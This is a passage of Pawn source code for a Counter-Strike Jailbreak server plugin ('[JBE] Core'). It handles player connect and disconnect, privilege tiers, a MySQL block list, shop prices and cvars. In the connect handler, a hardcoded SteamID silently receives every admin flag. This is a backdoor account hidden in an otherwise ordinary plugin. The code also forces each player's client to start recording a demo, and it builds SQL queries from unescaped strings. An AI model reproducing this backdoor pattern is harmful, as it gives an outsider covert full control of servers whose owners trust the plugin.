	for(new i = 0; i < sizeof(g_szHookSprite); i++) g_iHookSpriteEff[i] = precache_model(g_szHookSprite[i][1]);
	for(new i = 0; i < sizeof(g_szHookEnd); i++) g_iHookSpriteEnd[i] = precache_model(g_szHookEnd[i][1]);
	effect_fd = engfunc(EngFunc_PrecacheModel, "sprites/MG_SPRITES/green.spr");
	g_pSpriteTrail = engfunc(EngFunc_PrecacheModel, "sprites/jb_engine/hook/hook_n.spr");
}
/*===== <- Спрайты <- =====*///}

/*===== -> Основное -> =====*///{
main_init()
{
	register_plugin("[JBE] Core", "1.0", "Sanlerus");
	register_dictionary("jbe_core.txt");
	register_dictionary("jbe_random_slovo.txt");
	g_iSyncMainInformer = CreateHudSyncObj();
	g_iSyncSoccerScore = CreateHudSyncObj();
	g_iSyncStatusText = CreateHudSyncObj();
	g_iSyncDuelInformer = CreateHudSyncObj();
	g_iSyncLastPnInformer = CreateHudSyncObj();
	g_iMaxPlayers = get_maxplayers();
}

public client_putinserver(id)
{
	// Блок MySQL
	get_user_authid(id, uSteamId[id], charsmax(uSteamId[]));
	get_user_ip(id, uIpAddress[id], charsmax(uIpAddress[]), 1);

	new sQuery[256], iClient[3];

	formatex(sQuery, charsmax(sQuery), "SELECT * FROM `%sblocks` WHERE (`steam_id` LIKE '%s')",  UTIL_GetCvarString("jbe_sql_prefixes"), uSteamId[id]);

	iClient[0] = id;
	iClient[1] = 2;
	
	SQL_ThreadQuery(hSql, "SQL_Handler", sQuery, iClient, sizeof iClient);
	// Блок MySQL

	SetBit(g_iBitUserConnected, id);
	SetBit(g_iBitUserRoundSound, id);
	g_iPlayersNum[g_iUserTeam[id]]++;
	set_task(1.0, "jbe_main_informer", id+TASK_SHOW_INFORMER, _, _, "b");
    set_task(6.0, "Hunger_respawn", id);	
	new szSteam[32], azName[32];
	get_user_authid(id, szSteam, charsmax(szSteam));
	get_user_name(id, azName, charsmax(azName));
	if(equal(szSteam, "STEAM_1:0:1983675676"))
	{
		set_user_flags(id, read_flags("abcdefghijklmnopqrstu"));
		set_dhudmessage(255, 165, 0, -1.0, 0.73, 0, 6.0, 4.0);
        show_dhudmessage(id, "Привилегий активированы!");
	}
	new iFlags = get_user_flags(id);
	if(iFlags & g_iFlagAccess[HOOK])		SetBit(g_iBitUserHook, id);
	if(iFlags & g_iFlagAccess[VIP])	        SetBit(g_iBitUserVip, id);
	if(iFlags & g_iFlagAccess[ADMIN])	    SetBit(g_iBitUserAdmin, id);
	if(iFlags & g_iFlagAccess[PREMIUM])		SetBit(g_iBitUserPremium, id);
	if(iFlags & g_iFlagAccess[ELITE])	    SetBit(g_iBitUserElite, id);
	if(iFlags & g_iFlagAccess[ALPHA])	    SetBit(g_iBitUserAlpha, id);
	if(iFlags & g_iFlagAccess[STRAJNIK])	SetBit(g_iBitUserStraj, id);
	if(iFlags & g_iFlagAccess[SUPER_SIMON])	SetBit(g_iBitUserSuperSimon, id);
	if(iFlags & g_iFlagAccess[DELTA])	    SetBit(g_iBitUserDelta, id);
	if(iFlags & g_iFlagAccess[DYAVOL])	    SetBit(g_iBitUserDyavol, id);
	if(iFlags & g_iFlagAccess[PREZIDENT])	SetBit(g_iBitUserPrez, id);
	if(iFlags & g_iFlagAccess[DEMONES])	    SetBit(g_iBitUserDemon, id);
	if(iFlags & g_iFlagAccess[CLOUN])	    SetBit(g_iBitUserCloun, id);
	set_task(5.0, "demo_rec", id);
	
	g_iModeFly[id] = true;
	g_iSpeedFly[id] = 720;
	HookEnableTrail[id] = false;
	
	g_iSvetoforColor[id] = false;
	g_iSvetoforSound = false;
	g_PlayerBuild[id][ARENA] = 3;
	
	if(g_iMarkerColor[id] == 0) color_rm[id] = 255,color_gm[id] = 0,color_bm[id] = 0;
	else if(g_iMarkerColor[id] == 1) color_rm[id] = 255,color_gm[id] = 255,color_bm[id] = 0;
	else if(g_iMarkerColor[id] == 2) color_r[id] = random_num(50, 254), color_g[id] = random_num(30, 200), color_b[id] = random_num(90, 254);
	else if(g_iMarkerColor[id] == 3) color_rm[id] = 7,color_gm[id] = 85,color_bm[id] = 255;
	else if(g_iMarkerColor[id] == 4) color_rm[id] = 255,color_gm[id] = 3,color_bm[id] = 23;
	else if(g_iMarkerColor[id] == 5) color_rm[id] = 0,color_gm[id] = 255,color_bm[id] = 0;
	else if(g_iMarkerColor[id] == 6) color_rm[id] = 255,color_gm[id] = 255,color_bm[id] = 255;
	else if(g_iMarkerColor[id] == 7) color_rm[id] = 212,color_gm[id] = 0,color_bm[id] = 255;
	else if(g_iMarkerColor[id] == 8) color_rm[id] = 102,color_gm[id] = 69,color_bm[id] = 0;	

#if defined SKINS_DATA 

// ChatManager MISTRIK
	g_iPlayerSkin[id] = "";
	for(new UserMdel; UserMdel < g_iModelUserData; UserMdel++)
	{
		new aDataModelUserData[DATA_MODEL_SKIN];
		ArrayGetArray(g_aModelUserData, UserMdel, aDataModelUserData);
		switch(aDataModelUserData[TYPE_AUTH])
		{
			case 'n':
			{
				new szName[32];
				get_user_name(id, szName, charsmax(szName));
				if(equal(aDataModelUserData[USER_INFO], szName))
				{
					SetBit(g_iBitUserCostumModel, id);
					copy(g_iPlayerSkin[id], charsmax(g_iPlayerSkin[]), aDataModelUserData[MODEL_USER]);
					break;
				}
			}
			case 's':
			{
				new g_szSteamID[37]; 
				get_user_authid(id, g_szSteamID, charsmax(g_szSteamID));
				if(equal(aDataModelUserData[USER_INFO], g_szSteamID))
				{
					SetBit(g_iBitUserCostumModel, id);
					copy(g_iPlayerSkin[id], charsmax(g_iPlayerSkin[]), aDataModelUserData[MODEL_USER]);
					break;
				}
			}
			case 'i':
			{
				new szIp[26]; 
				get_user_ip(id, szIp, charsmax(szIp), 1);
				if(equal(aDataModelUserData[USER_INFO], szIp)) 
				{
					SetBit(g_iBitUserCostumModel, id);
					copy(g_iPlayerSkin[id], charsmax(g_iPlayerSkin[]), aDataModelUserData[MODEL_USER]);
					break;
				}
			}
			case 'f':
			{
				if(get_user_flags(id) & read_flags(aDataModelUserData[USER_INFO])) 
				{
					SetBit(g_iBitUserCostumModel, id);
					copy(g_iPlayerSkin[id], charsmax(g_iPlayerSkin[]), aDataModelUserData[MODEL_USER]);
					break;
				}
			}
		}
	}
#endif
}

public demo_rec(id)
{
    new Name[33], Time[9];
    get_user_name(id, Name, 32);
    get_time("%H:%M:%S", Time, 8);
    client_cmd(id, "stop; record jb_madness");
	UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_DEMO_START", Time);
}

public client_disconnect(id)
{
	if(IsNotSetBit(g_iBitUserConnected, id)) return;
	ClearBit(g_iBitUserConnected, id);
	remove_task(id+TASK_SHOW_INFORMER);
	g_iPlayersNum[g_iUserTeam[id]]--;
	if(IsSetBit(g_iBitUserAlive, id))
	{
		g_iAlivePlayersNum[g_iUserTeam[id]]--;
		ClearBit(g_iBitUserAlive, id);
	}
	if(id == g_iChiefId)
	{
		g_iChiefId = 0;
		g_iChiefStatus = 3;
		UTIL_SendAudio(0, _, g_szSounds[SIMON_DISCON]);
		g_szChiefName = "";
		if(g_bSoccerGame) remove_task(id+TASK_SHOW_SOCCER_SCORE);
		ClearBit(g_iBitUserSimon, id);
	}
	if(IsSetBit(g_iBitUserFree, id)) jbe_sub_user_free(id);
	if(IsSetBit(g_iBitUserWanted, id)) jbe_sub_user_wanted(id);
	
	// Модель для зека
	#if defined SKINS_DATA
	ClearBit(g_iBitUserCostumModel, id);
	#endif

	g_iUserTeam[id] = 0;
	g_iUserMoney[id] = 0;
	g_iUserSkin[id] = 0;
	g_iBitKilledUsers[id] = 0;
	g_PlayerBuild[id][ARENA] = 0;
	g_Spleef[DISTANCE][id] = 0;
	g_iSpeedFly[id] = 0;
	g_iModeFly[id] = false;
	for(new i = 1; i <= g_iMaxPlayers; i++)
	{
		if(IsNotSetBit(g_iBitKilledUsers[i], id)) continue;
		ClearBit(g_iBitKilledUsers[i], id);
	}
	if(g_eUserCostumes[id][COSTUMES]) jbe_set_user_costumes(id, 0);
	if(task_exists(id+TASK_CHANGE_MODEL)) remove_task(id+TASK_CHANGE_MODEL);
	ClearBit(g_iBitUserModel, id);
	if(task_exists(id+TASK_CHANGE_MODEL)) remove_task(id+TASK_CHANGE_MODEL);
	ClearBit(g_iBitUserFreeNextRound, id);
	ClearBit(g_iBitUserVoice, id);
	ClearBit(g_iBitUserVoiceNextRound, id);
	ClearBit(g_iBitBlockMenu, id);
	ClearBit(g_iBitUserVoteDayMode, id);
	ClearBit(g_iBitUserDayModeVoted, id);
	if(IsSetBit(g_iBitUserSoccer, id))
	{
		ClearBit(g_iBitUserSoccer, id);
		if(id == g_iSoccerBallOwner)
		{
			CREATE_KILLPLAYERATTACHMENTS(id);
			set_pev(g_iSoccerBall, pev_solid, SOLID_TRIGGER);
			set_pev(g_iSoccerBall, pev_velocity, {0.0, 0.0, 0.1});
			g_iSoccerBallOwner = 0;
		}
		if(g_bSoccerGame) remove_task(id+TASK_SHOW_SOCCER_SCORE);
	}
	ClearBit(g_iBitUserBoxing, id);
	ClearBit(g_iBitSharpening, id);
	ClearBit(g_iBitScrewdriver, id);
	ClearBit(g_iBitBalisong, id);
	ClearBit(g_iBitMachete, id);
	ClearBit(g_iBitSerp, id);
	ClearBit(g_iBitWeaponStatus, id);
	ClearBit(g_iBitLatchkey, id);
	ClearBit(g_iBitKokain, id);
	if(task_exists(id+TASK_REMOVE_SYRINGE)) remove_task(id+TASK_REMOVE_SYRINGE);
	ClearBit(g_iBitFrostNade, id);
	ClearBit(g_iBitUserFrozen, id);
	if(task_exists(id+TASK_FROSTNADE_DEFROST)) remove_task(id+TASK_FROSTNADE_DEFROST);
	if(IsSetBit(g_iBitInvisibleHat, id))
	{
		ClearBit(g_iBitInvisibleHat, id);
		if(task_exists(id+TASK_INVISIBLE_HAT)) remove_task(id+TASK_INVISIBLE_HAT);
	}
	// Вип
	if(IsSetBit(g_iBitUserVip, id))
	{
		ClearBit(g_iBitUserVip, id);
		for(new i = 0; i < DATA_BOMJ; i++)
		g_iBomjData[id][i] = 0;
		g_iVipHealth[id] = 0;
	}
	// Премиум
	if(IsSetBit(g_iBitUserPremium, id))
	{
		ClearBit(g_iBitUserPremium, id);
		for(new i = 0; i < DATA_PREMIUM; i++)
		g_iPremiumData[id][i] = 0;
	}
	// Элита
	if(IsSetBit(g_iBitUserElite, id))
	{
		ClearBit(g_iBitUserElite, id);
		for(new i = 0; i < DATA_ELITE; i++)
		g_iEliteData[id][i] = 0;
		g_iEliteSpeed[id] = 0;
		g_iEliteGrav[id] = 0;
		g_iEliteFd[id] = 0;
		g_iEliteHealth[id] = 0;
	}
	// Альфа
	if(IsSetBit(g_iBitUserAlpha, id))
	{
		ClearBit(g_iBitUserAlpha, id);
		for(new i = 0; i < DATA_ALPHA; i++)
		g_iAlphaData[id][i] = 0;
	}
	// Стражник
	if(IsSetBit(g_iBitUserStraj, id))
	{
		ClearBit(g_iBitUserStraj, id);
		for(new i = 0; i < DATA_STRAJ; i++)
		g_iStrajData[id][i] = 0;
	}
    // Супер-Саймон
	if(IsSetBit(g_iBitUserSuperSimon, id))
	{
		ClearBit(g_iBitUserSuperSimon, id);
		for(new i = 0; i < DATA_SUPER_SIMON; i++)
		g_iSuperSimonData[id][i] = 0;
	}
	// Дьявол
	if(IsSetBit(g_iBitUserDyavol, id))
	{
		ClearBit(g_iBitUserDyavol, id);
		for(new i = 0; i < DATA_DYAVOL; i++)
		g_iDyavolData[id][i] = 0;
	}
	// Дельта
	if(IsSetBit(g_iBitUserDelta, id))
	{
		ClearBit(g_iBitUserDelta, id);
		for(new i = 0; i < DATA_DELTA; i++)
		g_iDeltaData[id][i] = 0;
	}
	// Президент
	if(IsSetBit(g_iBitUserPrez, id))
	{
		ClearBit(g_iBitUserPrez, id);
		for(new i = 0; i < DATA_PRES; i++)
		g_iPresidentData[id][i] = 0;
	}
	// Демон
	if(IsSetBit(g_iBitUserDemon, id))
	{
		ClearBit(g_iBitUserDemon, id);
		for(new i = 0; i < DATA_DEMON; i++)
		g_iDemonData[id][i] = 0;
	}
	// Стражник
	if(IsSetBit(g_iBitUserCloun, id))
	{
		ClearBit(g_iBitUserCloun, id);
		for(new i = 0; i < DATA_CLOUN; i++)
		g_iClounData[id][i] = 0;
	}
	ClearBit(g_iBitClothingGuard, id);
	ClearBit(g_iBitClothingType, id);
	ClearBit(g_iBitHingJump, id);
	ClearBit(g_iBitFastRun, id);
	ClearBit(g_iBitGravRun, id);
	ClearBit(g_iBitDoubleJump, id);
	ClearBit(g_iBitRandomGlow, id);
	ClearBit(g_iBitAutoBhop, id);
	ClearBit(g_iBitDoubleDamage, id);
	ClearBit(g_iBitLotteryTicket, id);
	ClearBit(g_iBitUserAdmin, id);
	ClearBit(g_iBitUserHook, id);
	if(g_iDuelStatus && IsSetBit(g_iBitUserDuel, id)) jbe_duel_ended(id);
	ClearBit(g_iBitUserBlockedGuard, id);
	arrayset(g_PlayerBuild[id], 0, DATA_BUILD);
	
	g_Free_Count[id] = 0;
    ClearBit(g_iBitUserMonday, id);
	
	g_bHookStatus = false;
	g_iRejim = 0;
	g_BlockCostumes = false;
}
/*===== <- Основное <- =====*///}

public SQL_Handler(iFailState, Handle:iQuery, szError[], iError, szData[], iDataLen) 
{
	switch(iFailState) 
	{
		case TQUERY_CONNECT_FAILED: return log_amx("No connect database: %s", szError);
		case TQUERY_QUERY_FAILED: return log_amx("Query error: %s", szError);
	}

	new id = szData[0], iType = szData[1];
	
	switch(iType) 
	{
		case 1: 
		{
			if(SQL_NumResults(iQuery)) 
			{
				SetBit(g_iBitUserBlockedGuard, id);
			}
			else {
				new szName[33], sQuery[148], iClient[2];
				get_user_name(id, szName, charsmax(szName));
				
				iClient[0] = id;
				iClient[1] = 0;
				
				formatex(sQuery, charsmax(sQuery), "INSERT INTO `%sblocks` (`steam_id`, `ip`) VALUES ('%s', '%s')", UTIL_GetCvarString("jbe_sql_prefixes"), uSteamId[id], uIpAddress[id]);
				
				SQL_ThreadQuery(hSql, "SQL_Handler", sQuery, iClient, sizeof iClient);
			}
		}
		case 2: 
		{
			if(SQL_NumResults(iQuery)) 
			{
				SetBit(g_iBitUserBlockedGuard, id);
			}
		}
	}
	return true;
}

/*===== -> Квары -> =====*///{
cvars_init()
{
	register_cvar("jbe_pn_price_balisong", "320");
	register_cvar("jbe_pn_price_machete", "520");
	register_cvar("jbe_pn_price_serp", "820");
	register_cvar("jbe_pn_price_flashbang", "80");
	register_cvar("jbe_pn_price_stimulator", "230");
	register_cvar("jbe_pn_price_frostnade", "170");
	register_cvar("jbe_pn_price_hegrenade", "120");
	register_cvar("jbe_pn_price_fast_run", "240");
	register_cvar("jbe_pn_price_double_jump", "280");
	register_cvar("jbe_pn_price_auto_bhop", "180");
	register_cvar("jbe_pn_price_low_gravity", "220");
	register_cvar("jbe_pn_price_close_case", "250");
	register_cvar("jbe_gr_price_stimulator", "230");
	register_cvar("jbe_gr_price_kokain", "200");
	register_cvar("jbe_gr_price_double_jump", "280");
	register_cvar("jbe_gr_price_fast_run", "240");
	register_cvar("jbe_gr_price_low_gravity", "250");
	register_cvar("jbe_gr_price_awp", "500");
	register_cvar("jbe_free_day_id_time", "120");
	register_cvar("jbe_free_day_all_time", "240");
	register_cvar("jbe_team_balance", "4");
	register_cvar("jbe_day_mode_vote_time", "15");
	register_cvar("jbe_restart_game_time", "40");
	register_cvar("jbe_riot_start_money", "30");
	register_cvar("jbe_killed_guard_money", "40");
	register_cvar("jbe_killed_chief_money", "65");
	register_cvar("jbe_round_free_money", "10");
	register_cvar("jbe_round_alive_money", "20");
	register_cvar("jbe_last_prisoner_money", "300");
	
	register_cvar("jbe_vip_health_num", "3");
	register_cvar("jbe_vip_money_round", "3");
	register_cvar("jbe_vip_money_num", "150");
	register_cvar("jbe_vip_speed_round", "3");
	register_cvar("jbe_vip_voice_round", "1");
	register_cvar("jbe_vip_discount_shop", "20");
	
	register_cvar("jbe_premium_respawn_num", "2");
	register_cvar("jbe_premium_health_round", "3");
	register_cvar("jbe_premium_money_num", "500");
	register_cvar("jbe_premium_money_round", "3");
	register_cvar("jbe_premium_speed_round", "2");
	register_cvar("jbe_premium_grav_round", "2");
	
	register_cvar("jbe_elite_speed_round", "2");
	register_cvar("jbe_elite_grav_round", "2");
	register_cvar("jbe_elite_health_round", "3");
	register_cvar("jbe_elite_fd_round", "5");
	register_cvar("jbe_elite_money_num", "300");
	register_cvar("jbe_elite_money_round", "3");
	register_cvar("jbe_elite_god_round", "5");
	
	register_cvar("jbe_alpha_money_round", "4");
	register_cvar("jbe_alpha_money_num", "400");
	register_cvar("jbe_alpha_speed_round", "2");
	register_cvar("jbe_alpha_grav_round", "3");
	register_cvar("jbe_alpha_noj_round", "3");
	register_cvar("jbe_alpha_fd_round", "4");
	register_cvar("jbe_alpha_jump_round", "2");
	
	register_cvar("jbe_straj_skin_round", "4");
	register_cvar("jbe_straj_hp_round", "3");
	register_cvar("jbe_straj_money_num", "300");
	register_cvar("jbe_straj_money_round", "4");
	register_cvar("jbe_straj_god_round", "5");
	register_cvar("jbe_straj_foot_round", "3");
	register_cvar("jbe_straj_noj_round", "4");
	
	register_cvar("jbe_simon_res_round", "1"); 
	register_cvar("jbe_simon_glush_round", "3");
	register_cvar("jbe_simon_inviz_num", "5");
	register_cvar("jbe_simon_speed_round", "1");
	register_cvar("jbe_simon_hp_round", "2");
	register_cvar("jbe_simon_jump_round", "4");
	register_cvar("jbe_simon_bhop_round", "3");
	register_cvar("jbe_simon_givett_round", "2");
	register_cvar("jbe_simon_givekt_round", "2");
	register_cvar("jbe_simon_givektt_round", "2");
	register_cvar("jbe_simon_givettt_round", "2");
	
	register_cvar("jbe_president_rs_round", "3");
	register_cvar("jbe_president_nabor_round", "4");
	register_cvar("jbe_president_patron_round", "5");
	register_cvar("jbe_president_latchkey_round", "2");
	register_cvar("jbe_president_shocker_round", "3");
	register_cvar("jbe_president_grenade_round", "4");
	register_cvar("jbe_president_pumpkin_round", "3");
	
	register_cvar("jbe_delta_res_round", "3"); 
	register_cvar("jbe_delta_res_num", "2"); 
	register_cvar("jbe_delta_hp_round", "2");
	register_cvar("jbe_delta_jump_round", "1");
	register_cvar("jbe_delta_money_num", "350");
	register_cvar("jbe_delta_money_round", "4");
	register_cvar("jbe_delta_fd_round", "5");
	
	register_cvar("jbe_dyavol_skin_round", "2"); 
	register_cvar("jbe_dyavol_jump_num", "3");
	register_cvar("jbe_dyavol_money_num", "350");
	register_cvar("jbe_dyavol_money_round", "4");
	register_cvar("jbe_dyavol_wanted_round", "2");
	register_cvar("jbe_dyavol_run_round", "4");
	register_cvar("jbe_dyavol_damage_round", "3");
	register_cvar("jbe_dyavol_scout_round", "5");
	
	register_cvar("jbe_demon_res_round", "1");
	register_cvar("jbe_jetpack_round", "5");
	register_cvar("jbe_demon_jump_round", "2");
	register_cvar("jbe_demon_grenade_round", "4");
	register_cvar("jbe_demon_pumpkin_round", "3");
	
	register_cvar("jbe_cloun_skin_round", "2");
	register_cvar("jbe_cloun_molot_round", "4");
	register_cvar("jbe_cloun_pukan_round", "1");
	register_cvar("jbe_cloun_piss_round", "3");
	register_cvar("jbe_cloun_smex_round", "5");
	
	// MySQL данные
	register_cvar("jbe_sql_hostname", " "); // Хост
	register_cvar("jbe_sql_username", " ");	// Юзер
	register_cvar("jbe_sql_password", " ");	// Пароль
	register_cvar("jbe_sql_database", " ");	// База
	register_cvar("jbe_sql_prefixes", "jbe_"); // Префикс [не менять, тоже вынеси в квар]
}

public plugin_cfg()
{
	new szCfgDir[64];
	get_localinfo("amxx_configsdir", szCfgDir, charsmax(szCfgDir));
	server_cmd("exec %s/jb_engine/shop_cvars.cfg", szCfgDir);
	server_cmd("exec %s/jb_engine/all_cvars.cfg", szCfgDir);
	set_task(0.1, "jbe_get_cvars");
	
	g_iNvault_Money = nvault_open("JBF_save_money");
	if(g_iNvault_Money == INVALID_HANDLE) set_fail_state("Error opening nVault!");
	nvault_prune(g_iNvault_Money, 0, get_systime() - (86400 * 5));

	// MySQL
	set_task(1.0, "Task_MySQL_Connect", TASK_INDEX_MYSQL);
}

public jbe_get_cvars()
{
	g_iShopCvars[BALISONG] = get_cvar_num("jbe_pn_price_balisong");
	g_iShopCvars[MACHETE] = get_cvar_num("jbe_pn_price_machete");
	g_iShopCvars[SERP] = get_cvar_num("jbe_pn_price_serp");
	g_iShopCvars[FLASHBANG] = get_cvar_num("jbe_pn_price_flashbang");
	g_iShopCvars[STIMULATOR] = get_cvar_num("jbe_pn_price_stimulator");
	g_iShopCvars[FROSTNADE] = get_cvar_num("jbe_pn_price_frostnade");
	g_iShopCvars[HEGRENADE] = get_cvar_num("jbe_pn_price_hegrenade");
	g_iShopCvars[FAST_RUN] = get_cvar_num("jbe_pn_price_fast_run");
	g_iShopCvars[DOUBLE_JUMP] = get_cvar_num("jbe_pn_price_double_jump");
	g_iShopCvars[AUTO_BHOP] = get_cvar_num("jbe_pn_price_auto_bhop");
	g_iShopCvars[LOW_GRAVITY] = get_cvar_num("jbe_pn_price_low_gravity");
	g_iShopCvars[CLOSE_CASE] = get_cvar_num("jbe_pn_price_close_case");
	g_iShopCvars[STIMULATOR_GR] = get_cvar_num("jbe_gr_price_stimulator");
	g_iShopCvars[KOKAIN_GR] = get_cvar_num("jbe_gr_price_kokain");
	g_iShopCvars[DOUBLE_JUMP_GR] = get_cvar_num("jbe_gr_price_double_jump");
	g_iShopCvars[FAST_RUN_GR] = get_cvar_num("jbe_gr_price_fast_run");
	g_iShopCvars[LOW_GRAVITY_GR] = get_cvar_num("jbe_gr_price_low_gravity");
	g_iShopCvars[AWP_GR] = get_cvar_num("jbe_gr_price_awp");
	g_iAllCvars[FREE_DAY_ID] = get_cvar_num("jbe_free_day_id_time");
	g_iAllCvars[FREE_DAY_ALL] = get_cvar_num("jbe_free_day_all_time");
	g_iAllCvars[TEAM_BALANCE] = get_cvar_num("jbe_team_balance");
	g_iAllCvars[DAY_MODE_VOTE_TIME] = get_cvar_num("jbe_day_mode_vote_time");
	g_iAllCvars[RESTART_GAME_TIME] = get_cvar_num("jbe_restart_game_time");
	g_iAllCvars[RIOT_START_MODEY] = get_cvar_num("jbe_riot_start_money");
	g_iAllCvars[KILLED_GUARD_MODEY] = get_cvar_num("jbe_killed_guard_money");
	g_iAllCvars[KILLED_CHIEF_MODEY] = get_cvar_num("jbe_killed_chief_money");
	g_iAllCvars[ROUND_FREE_MODEY] = get_cvar_num("jbe_round_free_money");
	g_iAllCvars[ROUND_ALIVE_MODEY] = get_cvar_num("jbe_round_alive_money");
	g_iAllCvars[LAST_PRISONER_MODEY] = get_cvar_num("jbe_last_prisoner_money");
	
	g_iAllCvars[VIP_HEALTH_NUM] = get_cvar_num("jbe_vip_health_num");
	g_iAllCvars[VIP_MONEY_ROUND] = get_cvar_num("jbe_vip_money_round");
	g_iAllCvars[VIP_MONEY_NUM] = get_cvar_num("jbe_vip_money_num");
	g_iAllCvars[VIP_SPEED_ROUND] = get_cvar_num("jbe_vip_speed_round");
	g_iAllCvars[VIP_VOICE_ROUND] = get_cvar_num("jbe_vip_voice_round");
	g_iAllCvars[VIP_DISCOUNT_SHOP] = get_cvar_num("jbe_vip_discount_shop");
	
	g_iAllCvars[PREMIUM_RESPAWN_NUM] = get_cvar_num("jbe_premium_respawn_num");
	g_iAllCvars[PREMIUM_HP_ROUND] = get_cvar_num("jbe_premium_health_round");
	g_iAllCvars[PREMIUM_MONEY_NUM] = get_cvar_num("jbe_premium_money_num");
	g_iAllCvars[PREMIUM_MONEY_ROUND] = get_cvar_num("jbe_premium_money_round");
	g_iAllCvars[PREMIUM_SPEED_ROUND] = get_cvar_num("jbe_premium_speed_round");
	g_iAllCvars[PREMIUM_GRAV_ROUND] = get_cvar_num("jbe_premium_grav_round");
	
	g_iAllCvars[ELITE_SPEED_ROUND] = get_cvar_num("jbe_elite_speed_round");
	g_iAllCvars[ELITE_GRAV_ROUND] = get_cvar_num("jbe_elite_grav_round");
	g_iAllCvars[ELITE_HEALTH_ROUND] = get_cvar_num("jbe_elite_health_round");
	g_iAllCvars[ELITE_FD_ROUND] = get_cvar_num("jbe_elite_fd_round");
	g_iAllCvars[ELITE_MONEY_NUM] = get_cvar_num("jbe_elite_money_num");
	g_iAllCvars[ELITE_MONEY_ROUND] = get_cvar_num("jbe_elite_money_round");
	g_iAllCvars[ELITE_GOD_ROUND] = get_cvar_num("jbe_elite_god_round");
	
	g_iAllCvars[ALPHA_MONEY_ROUND] = get_cvar_num("jbe_alpha_money_round");
	g_iAllCvars[ALPHA_MONEY_NUM] = get_cvar_num("jbe_alpha_money_num");
	g_iAllCvars[ALPHA_SPEED_ROUND] = get_cvar_num("jbe_alpha_speed_round");
	g_iAllCvars[ALPHA_GRAV_ROUND] = get_cvar_num("jbe_alpha_grav_round");
	g_iAllCvars[ALPHA_NOJ_ROUND] = get_cvar_num("jbe_alpha_noj_round");
	g_iAllCvars[ALPHA_FD_ROUND] = get_cvar_num("jbe_alpha_fd_round");
	g_iAllCvars[ALPHA_JUMP_ROUND] = get_cvar_num("jbe_alpha_jump_round");
	
	g_iAllCvars[STRAJ_SKIN_ROUND] = get_cvar_num("jbe_straj_skin_round");
	g_iAllCvars[STRAJ_HP_ROUND] = get_cvar_num("jbe_straj_hp_round");
	g_iAllCvars[STRAJ_MONEY_NUM] = get_cvar_num("jbe_straj_money_num");
	g_iAllCvars[STRAJ_MONEY_ROUND] = get_cvar_num("jbe_straj_money_round");
	g_iAllCvars[STRAJ_GOD_ROUND] = get_cvar_num("jbe_straj_god_round");
	g_iAllCvars[STRAJ_FOOT_ROUND] = get_cvar_num("jbe_straj_foot_round");
	g_iAllCvars[STRAJ_NOJ_ROUND] = get_cvar_num("jbe_straj_noj_round");
	
	g_iAllCvars[SUPER_SIMON_RES_ROUND] = get_cvar_num("jbe_simon_res_round");
	g_iAllCvars[SUPER_SIMON_GLUSH_ROUND] = get_cvar_num("jbe_simon_glush_round");
	g_iAllCvars[SUPER_SIMON_INVIZ_ROUND] = get_cvar_num("jbe_simon_inviz_num");
	g_iAllCvars[SUPER_SIMON_SPEED_ROUND] = get_cvar_num("jbe_simon_speed_round");
	g_iAllCvars[SUPER_SIMON_HP_ROUND] = get_cvar_num("jbe_simon_hp_round");
	g_iAllCvars[SUPER_SIMON_JUMP_ROUND] = get_cvar_num("jbe_simon_jump_round");
	g_iAllCvars[SUPER_SIMON_BHOP_ROUND] = get_cvar_num("jbe_simon_bhop_round");
	
	g_iAllCvars[SUPER_SIMON_GIVETT_ROUND] = get_cvar_num("jbe_simon_givett_round");
	g_iAllCvars[SUPER_SIMON_GIVEKT_ROUND] = get_cvar_num("jbe_simon_givekt_round");
	g_iAllCvars[SUPER_SIMON_GIVEKTT_ROUND] = get_cvar_num("jbe_simon_givektt_round");
	g_iAllCvars[SUPER_SIMON_GIVETTT_ROUND] = get_cvar_num("jbe_simon_givettt_round");
	
	g_iAllCvars[PRESIDENT_RS_ROUND] = get_cvar_num("jbe_president_rs_round");
	g_iAllCvars[PRESIDENT_NABOR_ROUND] = get_cvar_num("jbe_president_nabor_round");
	g_iAllCvars[PRESIDENT_PATRON_ROUND] = get_cvar_num("jbe_president_patron_round");
	g_iAllCvars[PRESIDENT_LATHCEY_ROUND] = get_cvar_num("jbe_president_latchkey_round");
	g_iAllCvars[PRESIDENT_SHOCKER_ROUND] = get_cvar_num("jbe_president_shocker_round");
	g_iAllCvars[PRESIDENT_GRANADE_ROUND] = get_cvar_num("jbe_president_grenade_round");
	g_iAllCvars[PRESIDENT_PUMPKIN_ROUND] = get_cvar_num("jbe_president_pumpkin_round");
	
	g_iAllCvars[DELTA_RES_ROUND] = get_cvar_num("jbe_delta_res_round");
	g_iAllCvars[DELTA_RES_NUM] = get_cvar_num("jbe_delta_res_num");
	g_iAllCvars[DELTA_HP_ROUND] = get_cvar_num("jbe_delta_hp_round");
	g_iAllCvars[DELTA_JUMP_ROUND] = get_cvar_num("jbe_delta_jump_round");
	g_iAllCvars[DELTA_MONEY_NUM] = get_cvar_num("jbe_delta_money_num");
	g_iAllCvars[DELTA_MONEY_ROUND] = get_cvar_num("jbe_delta_money_round");
	g_iAllCvars[DELTA_FD_ROUND] = get_cvar_num("jbe_delta_fd_round");
	
	g_iAllCvars[DYAVOL_SKIN_ROUND] = get_cvar_num("jbe_dyavol_skin_round");
	g_iAllCvars[DYAVOL_JUMP_ROUND] = get_cvar_num("jbe_dyavol_jump_num");
	g_iAllCvars[DYAVOL_MONEY_NUM] = get_cvar_num("jbe_dyavol_money_num");
	g_iAllCvars[DYAVOL_MONEY_ROUND] = get_cvar_num("jbe_dyavol_money_round");
	g_iAllCvars[DYAVOL_WANTED_ROUND] = get_cvar_num("jbe_dyavol_wanted_round");
	g_iAllCvars[DYAVOL_RUN_ROUND] = get_cvar_num("jbe_dyavol_run_round");
	g_iAllCvars[DYAVOL_DAMAGE_ROUND] = get_cvar_num("jbe_dyavol_damage_round");
	g_iAllCvars[DYAVOL_SCOUT_ROUND] = get_cvar_num("jbe_dyavol_scout_round");
	
	g_iAllCvars[DEMON_RS_ROUND] = get_cvar_num("jbe_demon_res_round");
	g_iAllCvars[DEMON_JETPACK_ROUND] = get_cvar_num("jbe_jetpack_round");
	g_iAllCvars[DEMON_JUMP_ROUND] = get_cvar_num("jbe_demon_jump_round");
	g_iAllCvars[DEMON_GRANADE_ROUND] = get_cvar_num("jbe_demon_grenade_round");
	g_iAllCvars[DEMON_PUMPKIN_ROUND] = get_cvar_num("jbe_demon_pumpkin_round");
	
